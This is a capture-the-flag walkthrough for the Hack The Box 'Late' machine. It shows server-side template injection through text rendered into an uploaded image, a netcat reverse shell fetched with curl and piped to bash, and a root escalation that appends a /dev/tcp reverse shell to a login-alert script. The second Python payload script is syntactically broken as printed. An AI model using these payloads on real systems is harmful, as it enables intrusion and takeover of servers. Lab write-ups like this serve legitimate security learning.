---
title: Late Machine HTB
date: 2023-02-1 00:18:00 +0700
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [machines]
---

## Enumeration

```ruby
Nmap scan report for 10.129.170.15
Host is up (0.048s latency).

PORT STATE SERVICE VERSION
20/tcp closed ftp-data
80/tcp open http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## User exploit

If we look at the page, we have a contact form. Let's check it with burp. Not much can be done.

But if we take a closer look at the page, we see a photo editor, so let's add it to /etc/hosts.

As we can see as soon as we enter the page, it uses Flask (which uses `Jinga2` template by default), so we are going to try to put a SSTI by image:

So we are going to create a python script with a payload to later upload it to the platform:

```python
from PIL import Image, ImageDraw, ImageFont

	def main():
	
	img = Image.new('RGB', (2000,100)) #Create an image
	draw = ImageDraw.Draw(img)
	myFont = ImageFont.truetype('LiberationMono-Regular.ttf', 15)
	payload = "{{ 191 * 7 }}" # This will be our payload
	draw.text((0,3), payload, fill=(255,255,255), font=myFont) 
	img.save('payload.png')
	
if __name__ == '__main__':
	main()
```

and if we upload this script to the page, it reports 1337, so it is vulnerable to SSTI. 

We are going to modify the script a little bit so that it will change the payload by the code that we introduce between " " :

```python
from PIL import Image, ImageDraw, ImageFont
import sys
def main():
    if len(sys.argv) < 2:
        print('Usage: {} <cmd>'.format(sys.argv[0]))
        exit()
    img = Image.new('RGB', (2000,100))
    draw = ImageDraw.Draw(img)
    myFont = ImageFont.truetype('LiberationMono-Regular.ttf', 15)
    payload = self._TemplateReference__context.namespace.__init__.__globals__.os.popen("{cmd}").read().format(cmd=sys.argv[1]) draw.text((0,3), payload, fill=(255,255,255), font=myFont) # payload
    img.save('payload.png')

if __name__ == '__main__':
    main()

# IMPORTANT NOTE: in payload = ... open it with four " followed by another four {. Then, after read() and before .format
# Close them in the same way: first four } and then four "
```

So let's upload a RevShell. First we create the shell.sh file and put the shell command in it:

```bash
#!/bin/bash
rm /tmp/wk;mkfifo /tmp/wk;cat /tmp/wk|/bin/sh -i 2>&1|nc 10.10.14.58 1234 >/tmp/wk
```

We create the file with the script
```python
python3 image.py "curl http://10.10.14.58:8000/shell.sh| bash"
```

and if we enter the page and run it, we get the R.E.

## Root Exploit

As we have access to the private key of svc_acc, we copy it to our local machine, give ``chmod 600 id_rsa` and connect via ssh: `ssh svc_acc@10.129.170.15 -i id_rsa`. 
We look for files owned by sv_acc:

```shell
find / -type f -user svc_acc 2>/dev/null
```

and we see one ssh-alert.sh, so let's investigate it:

```bash
#!/bin/bash
RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User: $PAM_USER
        User IP Host: $PAM_RHOST
        Service: $PAM_SERVICE
        TTY: $PAM_TTY
        Date: `date`
        Server: `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi
```

In the if of the script we can see how the user root@late.htb receives a notification if any user accesses the machine via ssh.

With the help of pspy, we can see how the script is executed every time we access the machine via ssh.

If we try to overwrite the script, we have no access, because if we look at the `lsattr` we can see that it has `---a---e---` so we can only append text to it, so let's add a R.S:

```shell
echo "bash -i >& /dev/tcp/10.10.14.58/1337 0>&1" >> /usr/local/sbin/ssh-alert.sh
```

And if we listen on port 1337 and exit the SSH connection, we receive a shell as root user on the local machine. 
